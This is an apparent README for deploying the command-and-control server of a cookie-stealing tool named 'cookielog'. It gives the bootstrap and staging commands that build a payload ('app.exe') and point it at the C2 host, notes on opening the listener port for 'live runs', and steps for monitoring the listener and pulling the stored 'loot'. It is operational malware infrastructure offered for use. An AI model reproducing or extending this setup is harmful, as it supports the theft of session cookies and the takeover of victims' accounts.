# VPS listener

`bootstrap.sh` turns a clean Debian/Ubuntu host into the C2 listener:

```sh
# on the VPS, from the repo root
scp -r . root@vps:/root/cookielog
ssh root@vps
cd /root/cookielog
./deploy/vps/bootstrap.sh c2.example.com
```

Before running, point `A` (and `AAAA` if the host has IPv6) at the VPS. Caddy
issues and renews the certificate itself; there is no certbot step.

## What runs

| unit | bind | role |
|------|------|------|
| `cklog-listener.service` | `127.0.0.1:9415` | `listen.py`, writes `/opt/cookielog/loot` |
| `caddy` | `0.0.0.0:80,443` | TLS, reverse proxy to the listener |

The listener is not reachable from the internet except through Caddy.

## Current payload and TLS

The payload builds HTTP requests on raw Winsock, so it does not speak TLS yet.
Two options until the schannel stage lands:

```sh
./deploy/vps/bootstrap.sh c2.example.com --plain
python build.py stage app.exe --c2 http://c2.example.com:9415/
```

`--plain` opens TCP 9415 in ufw; the listener still binds `0.0.0.0`, so the
header is the only thing between that port and the internet. Use it for live
runs, not as the permanent shape.

After stage 4, drop `--plain` and stage with `https://c2.example.com/`.

## Operations

```sh
systemctl status cklog-listener caddy
journalctl -u cklog-listener -f
curl -s https://c2.example.com/health
curl -s https://c2.example.com/coverage | head
```

Loot stays on the VPS under `/opt/cookielog/loot` (mode 700, user `cklog`).
Pull it with `rsync`; do not sync it back into git.
